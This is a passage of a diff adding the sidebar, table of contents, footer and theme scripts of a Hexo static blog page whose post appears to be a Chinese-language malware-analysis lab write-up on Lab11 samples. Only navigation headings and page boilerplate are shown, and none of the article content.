+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">John Doe</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">28</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#知识引入"><span class="nav-number">1.</span> <span class="nav-text">知识引入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#目标"><span class="nav-number">2.</span> <span class="nav-text">目标</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#流程"><span class="nav-number">3.</span> <span class="nav-text">流程</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#实践"><span class="nav-number">4.</span> <span class="nav-text">实践</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#实例1"><span class="nav-number">4.1.</span> <span class="nav-text">实例1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#基础静态分析"><span class="nav-number">4.1.1.</span> <span class="nav-text">基础静态分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#高级静态动态结合分析"><span class="nav-number">4.1.2.</span> <span class="nav-text">高级静态动态结合分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Lab11-01-exe"><span class="nav-number">4.1.2.1.</span> <span class="nav-text">Lab11-01.exe</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#资源PE文件"><span class="nav-number">4.1.2.2.</span> <span class="nav-text">资源PE文件</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#小结"><span class="nav-number">4.1.3.</span> <span class="nav-text">小结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#实例2"><span class="nav-number">4.2.</span> <span class="nav-text">实例2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#静态分析"><span class="nav-number">4.2.1.</span> <span class="nav-text">静态分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#高级静态动态结合分析-1"><span class="nav-number">4.2.2.</span> <span class="nav-text">高级静态动态结合分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#小结-1"><span class="nav-number">4.2.3.</span> <span class="nav-text">小结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#实例3"><span class="nav-number">4.3.</span> <span class="nav-text">实例3</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#基础静态分析-1"><span class="nav-number">4.3.1.</span> <span class="nav-text">基础静态分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Lab11-03-exe"><span class="nav-number">4.3.1.1.</span> <span class="nav-text">Lab11-03.exe</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Lab11-03-dll"><span class="nav-number">4.3.1.2.</span> <span class="nav-text">Lab11-03.dll</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#高级静态动态结合分析-2"><span class="nav-number">4.3.2.</span> <span class="nav-text">高级静态动态结合分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#小结-2"><span class="nav-number">4.3.3.</span> <span class="nav-text">小结</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#补充知识"><span class="nav-number">5.</span> <span class="nav-text">补充知识</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考"><span class="nav-number">6.</span> <span class="nav-text">参考</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
